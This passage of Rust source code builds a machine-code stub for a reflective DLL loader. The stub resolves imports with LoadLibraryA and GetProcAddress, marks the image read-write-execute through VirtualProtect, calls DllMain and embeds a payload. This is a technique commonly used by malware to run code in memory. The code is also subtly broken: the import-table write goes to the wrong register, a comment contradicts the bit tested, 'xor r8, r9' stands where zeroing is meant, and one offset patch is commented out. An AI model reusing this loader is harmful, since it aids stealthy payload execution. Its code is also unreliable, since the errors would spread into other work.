    mov_rm32(&mut c, RCX, RSI, 0x0C);
    add_rr32(&mut c, RAX, RCX);
    test_rr32(&mut c, RCX, RCX);
    let jz_import_done = jcc32(&mut c, 0x84);

    // DLL name = image_base + Name RVA
    add_rr(&mut c, RCX, R15);

    // Call LoadLibraryA(name)
    // rcx is already set. r14 = LoadLibraryA
    mov_mr64(&mut c, RBP, -0x48, RSI);
    emit_call_with_shadow(&mut c, R14, 0x20);
    mov_rm64(&mut c, RSI, RBP, -0x48);
    test_rr(&mut c, RAX, RAX);
    let jz_lla_fail = jcc8(&mut c, 0x74);

    // rax = loaded dll handle (base)
    mov_mr64(&mut c, RBP, -0x40, RAX);

    // ILT = OriginalFirstThunk (or FirstThunk if OFT is 0)
    mov_rm32(&mut c, RCX, RSI, 0);
    test_rr32(&mut c, RCX, RCX);
    let jnz_has_oft = jcc8(&mut c, 0x75);
    mov_rm32(&mut c, RCX, RSI, 0x10);
    patch8(&mut c, jnz_has_oft);
    add_rr(&mut c, RCX, R15);
    mov_mr64(&mut c, RBP, -0x50, RCX);
    mov_mr64(&mut c, RBP, -0x50, RCX);

    // IAT = FirstThunk
    mov_rm32(&mut c, RCX, RSI, 0x10);
    add_rr(&mut c, RCX, R15);
    mov_mr64(&mut c, RBP, -0x58, RCX);

    // Walk thunk
    let thunk_loop = c.len();
    mov_rm64(&mut c, RAX, RBP, -0x50);
    mov_rm64(&mut c, RAX, RAX, 0);
    test_rr(&mut c, RAX, RAX);
    let jz_thunk_done = jcc32(&mut c, 0x84);

    // Check ordinal (bit 63)
    // bt rax, 32; jc skip
    c.extend_from_slice(&[0x48, 0x0F, 0xBA, 0xE0, 0x3F]);
    let jc_ordinal = jcc8(&mut c, 0x72);

    // By name: rax = RVA = IMAGE_IMPORT_BY_NAME
    add_rr(&mut c, RAX, R15);
    add_ri(&mut c, RAX, 2);

    // Call  GetProcAddress(dll_handle, func_name)
    mov_rm64(&mut c, RCX, RBP, -0x40);
    mov_rr(&mut c, RDX, RAX);
    emit_call_with_shadow(&mut c, R13, 0x20);

    // Write result to IAT
    mov_rm64(&mut c, RCX, RBP, -0x58);
    mov_mr64(&mut c, RAX, 0, RAX);

    patch8(&mut c, jc_ordinal);

    // Advance ILT and iAT: [rbp-0x50] += 8, [rbp-0x58] += 8
    mov_rm64(&mut c, RAX, RBP, -0x50);
    add_ri(&mut c, RAX, 8);
    mov_mr64(&mut c, RBP, -0x50, RAX);
    mov_rm64(&mut c, RAX, RBP, -0x58);
    add_ri(&mut c, RAX, 8);
    mov_mr64(&mut c, RBP, -0x58, RAX);

    jmp_back(&mut c, thunk_loop);
    patch32(&mut c, jz_thunk_done);

    patch8(&mut c, jz_lla_fail);

    // Next import descriptor (+20 byte)
    add_ri(&mut c, RSI, 0x14);
    let offset_back = (import_loop as i32) - (c.len() as i32 + 5);
    c.push(0xE9);
    c.extend_from_slice(&offset_back.to_le_bytes());

    patch32(&mut c, jz_import_done);
    patch32(&mut c, jz_no_import);


    // Virtual Protect -> RX

    // VirtualProtect(image_base, SizeOfImage, PAGE_EXECUTE_READWRITE, &old)
    mov_rr(&mut c, RCX, R15);
    mov_rm64(&mut c, RAX, RBP, -0x28);
    mov_rm32(&mut c, RDX, RAX, 0x50);
    mov_ri32(&mut c, R8, 0x40);
    lea_rd(&mut c, R9, RBP, -0x48);
    mov_rm64(&mut c, RAX, RBP, -0x10);
    emit_call_with_shadow(&mut c, RAX, 0x20);

    // Call DllMain
    mov_rm64(&mut c, RAX, RBP, -0x28);
    mov_rm32(&mut c, RAX, RAX, 0x28);
    add_rr(&mut c, RAX, R15);

    mov_rr(&mut c, RCX, R15);
    mov_ri32(&mut c, RDX, 1);
    xor_rr(&mut c, R8, R9);
    emit_call_with_shadow(&mut c, RAX, 0x20);

    // EPILOGUE
    let exit_lable = c.len();
    pop_r(&mut c, RDI); 
    pop_r(&mut c, RSI);
    pop_r(&mut c, R15); 
    pop_r(&mut c, R14);
    pop_r(&mut c, R13); 
    pop_r(&mut c, R12);
    mov_rr(&mut c, RSP, RBP);
    pop_r(&mut c, RBP);
    ret(&mut c);

    // Patch all falure jumps to exit 
    let exit_off = |pos: usize| -> i32 { (exit_lable as i32) - (pos as i32 + 6) };
    let e1_off = (exit_lable as i32) - (jmp_exit_1 as i32 + 5);
    c[jmp_exit_1 + 1] = (e1_off & 0xFF) as u8;
    c[jmp_exit_1 + 2] = ((e1_off >> 8) & 0xFF) as u8;
    c[jmp_exit_1 + 3] = ((e1_off >> 16) & 0xFF) as u8;
    c[jmp_exit_1 + 4] = ((e1_off >> 24) & 0xFF) as u8;

    // Patch alloc faliure jumps
    let a1_off = exit_off(jz_alloc1_fail);
    c[jz_alloc1_fail + 2..jz_alloc1_fail + 6].copy_from_slice(&a1_off.to_le_bytes());
    let a2_off = exit_off(jz_alloc2_fail);
    c[jz_alloc2_fail + 2..jz_alloc2_fail + 6].copy_from_slice(&a2_off.to_le_bytes());

    // Append starting table
    let stub_code_end = c.len();
    let mut string_starts: Vec<usize> = Vec::new();
    for (_, bytes) in strings {
        string_starts.push(c.len());
        c.extend_from_slice(bytes);
    }
    let str_table_size = c.len() - stub_code_end;

    // Patch string lEA instructions
    for (lea_pos, str_idx) in &str_lea_patches {
        let offset = (string_starts[*str_idx] as i32) - 5;
        let off_bytes = offset.to_le_bytes();
        c[*lea_pos + 3] = off_bytes[0];
        c[*lea_pos + 4] = off_bytes[1];
        c[*lea_pos + 5] = off_bytes[2];
        c[*lea_pos + 6] = off_bytes[3];
    } 

    let payload_start = c.len();
    let po_bytes = payload_start.to_le_bytes();
    c[lea_payload_pos + 3] = po_bytes[0];
    // c[lea_payload_pos + 4] = po_bytes[1];
    c[lea_payload_pos + 5] = po_bytes[2];
    c[lea_payload_pos + 6] = po_bytes[3];

    eprintln!("Stub code: {} bytes, starting table: {} bytes, total: {}", stub_code_end, str_table_size, c.len());

    (c, (string_starts, str_table_size))
}